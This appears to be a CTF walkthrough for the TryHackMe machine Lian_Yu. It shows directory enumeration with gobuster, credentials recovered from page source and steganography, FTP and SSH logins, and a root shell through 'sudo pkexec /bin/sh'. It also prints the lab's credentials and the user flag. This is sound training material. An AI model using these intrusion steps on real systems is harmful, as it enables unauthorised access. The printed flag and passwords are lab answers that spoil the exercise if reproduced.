# Lian_Yu_Walkthrough

## 🏹 Lian_Yu – Capture The Flag Walkthrough

### 📌 Introduction

Lian_Yu is a beginner-friendly Capture The Flag (CTF) machine available on TryHackMe. The challenge focuses on web enumeration, credential discovery, steganography, SSH access, and privilege escalation techniques.

The objective is to gain initial access to the target machine, retrieve the user flag, and finally escalate privileges to obtain root access.

## 🔎 1. Reconnaissance & Enumeration

Before starting the attack process, establish a connection to the TryHackMe VPN and obtain access to the target machine.

---

### 📌 Nmap Scan

The first step is to identify open ports and running services on the target machine.

**Command Used**

```bash 
nmap -sC -sV -A 10.80.133.131
```

**Result**

<img width="641" height="505" alt="image" src="https://github.com/user-attachments/assets/f6c14846-6d85-49e4-9e4b-ef743457ad7a" />
<img width="643" height="506" alt="image" src="https://github.com/user-attachments/assets/df39d2da-1880-4854-bccb-fc7bf3ba87ea" />

**Observation**

The scan reveals several open services:

- FTP (Port 21)
- SSH (Port 22)
- HTTP (Port 80)

Since a web service is available, further enumeration of the website is performed.

---

### 📌 Directory Enumeration (Gobuster)

To discover hidden directories on the web server, Gobuster is used.

**Command Used**

```bash
gobuster dir -u http://10.80.133.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Result**

<img width="627" height="378" alt="image" src="https://github.com/user-attachments/assets/b5e8146e-54c9-4b61-ba31-d659172b8bf8" />

**Observation**

A hidden directory named:

```bash
/island
```

is discovered and becomes the next target for investigation.

---

## 🌐 2. Web Enumeration

### 📌 Exploring /island

Navigate to:
```bash
http://10.80.133.131/island
```

**Result**

<img width="908" height="517" alt="image" src="https://github.com/user-attachments/assets/487acff1-71a2-4bd4-972f-e85739f2e736" />

The page displays a mysterious message with no obvious clues.

---

### 📌 Source Code Analysis

The page source is inspected using:

```bash
Ctrl + U
```

**Result**

<img width="1002" height="502" alt="image" src="https://github.com/user-attachments/assets/297d3f1d-873d-44c0-bd2d-aafb79d04883" />

**Discovery**

A hidden code word is found:

```bash
vigilante
```

This keyword appears to be important for the next stage of the challenge.

---

### 📌 Recursive Enumeration

Further directory enumeration is performed on the newly discovered path.

**Command Used**

```bash
gobuster dir -u http://10.80.133.131/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Result**

<img width="620" height="323" alt="image" src="https://github.com/user-attachments/assets/fbe451d5-5540-422c-846e-03d67e3826b8" />

**Discovery**

A new directory is found:

```bash
/island/2100
```

---

### 📌 Exploring /island/2100

Navigate to:

```bash
http://10.80.133.131/island/2100/
```

**Result**

<img width="857" height="750" alt="image" src="https://github.com/user-attachments/assets/9335e415-bbc7-44c7-a0f2-492b258dfd53" />

The page contains a broken YouTube video and another clue hidden within the source code.

---

### 📌 Source Code Analysis

Viewing the page source reveals a hidden comment.

**Result**

<img width="723" height="377" alt="image" src="https://github.com/user-attachments/assets/41ad25bc-59e6-43ae-8907-b44554494093" />

**Observation**

The comment references a file ending with:

```bash
.ticket
```

This suggests that a hidden ticket file exists inside the directory.

---

### 📌 Searching for Ticket Files

Gobuster is used again to search for files with the `.ticket` extension.

Command Used

```bash
gobuster dir -u http://10.80.133.131/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

**Result**

<img width="632" height="347" alt="image" src="https://github.com/user-attachments/assets/2913f23b-6737-467f-bc5c-316946b9ed58" />

**Discovery**

A file named:

```bash
green_arrow.ticket
```

is discovered.

---

### 📌 Retrieving the Ticket

Accessing the file reveals a token. `http://10.80.133.131/island/2100/green_arrow.ticket` in the browser

<img width="770" height="303" alt="image" src="https://github.com/user-attachments/assets/0f3aecaf-10d2-49ad-b318-e3db2d011bfb" />

**Information Obtained**

Username:

```
vigilante
````

Token:

```
RTy8yhBQdscX
```

The token appears to be encoded.

---

## 🔓 3. Credential Discovery & FTP Access

### 📌 Decoding the Token

The token is analyzed using CyberChef.

**Result**

<img width="972" height="785" alt="image" src="https://github.com/user-attachments/assets/a1719f50-234d-41ee-952d-f6097e8c0b5d" />


**Decoded Password**

```
!#th3h00d
```

---

### 📌 FTP Login

Using the discovered credentials, access to the FTP server is obtained.

**Command Used**

```
ftp 10.80.133.131
```

**Credentials**

```
Username: vigilante
Password: !#th3h00d
```

**Result**

<img width="626" height="436" alt="image" src="https://github.com/user-attachments/assets/77f1bbc2-1c26-4bf9-815b-37636e4d9b21" />

After logging in, available files are listed.

```
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user
```

---

### 📥 Downloading Files

**Command Used**

```bash
binary

get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
get .other_user
```

**Result**

<img width="637" height="506" alt="image" src="https://github.com/user-attachments/assets/27f3f687-6efa-4ef0-8ccd-8ca0c4fd77bd" />

<img width="535" height="160" alt="image" src="https://github.com/user-attachments/assets/98b54900-cb93-48ef-862d-185a4bde78bd" />

## 🔍 4. Steganography Analysis

### 📌 Analyzing Downloaded Files

After downloading all files from the FTP server, further analysis is performed to identify hidden information.

The image file `aa.jpg` appears suspicious and is selected for steganography analysis.

---

### 📌 Using Stegseek

**Command Used**

```bash
stegseek aa.jpg
```

**Result**

<img width="651" height="335" alt="image" src="https://github.com/user-attachments/assets/0e6276ae-6e9a-4d73-8f44-84b80359a980" />

The tool successfully extracts hidden files from the image.

**Files Recovered**

```text
passwd.txt
shado
```

These files may contain authentication-related information that can be used for further access.

---

### 📌 Analyzing Extracted Files

The recovered files are examined using the `cat` command.

**Command Used**

```bash
cat passwd.txt

cat shado
```

**Result**

<img width="642" height="312" alt="image" src="https://github.com/user-attachments/assets/d95e86e5-bc5d-4a67-8999-e976a5ccfd04" />

### 📌 Discovery

While reviewing the contents of the extracted files, a password is discovered:

```text
M3tahuman
```

This password appears to belong to another user account on the target machine.

---

## 🔑 5. SSH Access

### 📌 SSH Login

After discovering the password from the extracted files, SSH access is attempted using the user account found in the challenge.

**Command Used**

```bash
ssh slade@10.80.133.131
```

**Password**

```text
M3tahuman
```

**Result**

<img width="628" height="455" alt="image" src="https://github.com/user-attachments/assets/69a98c41-14d6-48a1-80b4-0eb5af6efe62" />

<img width="647" height="507" alt="image" src="https://github.com/user-attachments/assets/3feb77cd-fe64-46bd-b802-baa827331130" />

The login is successful and access to the target machine is obtained.

---

### 📌 Obtaining User Flag

After logging into the system, the user flag can be accessed.

**Command Used**

```bash
cat user.txt
```

**Result**

<img width="630" height="475" alt="image" src="https://github.com/user-attachments/assets/dbc0954e-daf4-4b6a-9449-243f39b22a36" />

### 📌 User Flag

```text
THM{p30p7E_K33p_53CRET5__C0MPUT3E%_D0N'T}
```

The first flag has been successfully obtained.

---

## 🚀 6. Privilege Escalation

### 📌 Checking Sudo Permissions

To identify possible privilege escalation paths, the sudo permissions are checked.

**Command Used**

```bash
sudo -l
```

**Result**

<img width="630" height="475" alt="image" src="https://github.com/user-attachments/assets/96c4c497-6f72-471e-9598-b304bd0cec09" />

### 📌 Observation

The output shows that the user can execute:

```text
/usr/bin/pkexec
```

This indicates a possible path to gain elevated privileges.

---

### 📌 Gaining Root Access

Using the allowed sudo command, a root shell is obtained.

**Command Used**

```bash
sudo pkexec /bin/sh
```

The shell prompt changes to `#`, indicating successful root access.

---

After obtaining root privileges, navigate to the root directory and read the final flag.

**Commands Used**

```bash
cd /root

ls

cat root.txt
```

**Result**

<img width="650" height="502" alt="image" src="https://github.com/user-attachments/assets/5e8593ef-6bd2-42c7-9193-5753bc0deaa7" />

The root flag is successfully retrieved.

---

## 📌 Conclusion

Throughout this challenge, several penetration testing techniques were used to compromise the target machine successfully.

### Key Findings

* Hidden directories were discovered through Gobuster enumeration.
* Source code analysis revealed important clues and credentials.
* FTP access was obtained using recovered credentials.
* Steganography analysis exposed hidden files containing sensitive information.
* SSH access was gained using the discovered password.
* The user flag was successfully obtained.
* Privilege escalation was achieved using pkexec.
* Root access was obtained and the final flag was captured.

### Outcome

The target machine was successfully compromised from initial access to root-level control, demonstrating the importance of securing credentials, restricting file exposure, and properly managing privilege assignments.

🏁 Challenge completed successfully.
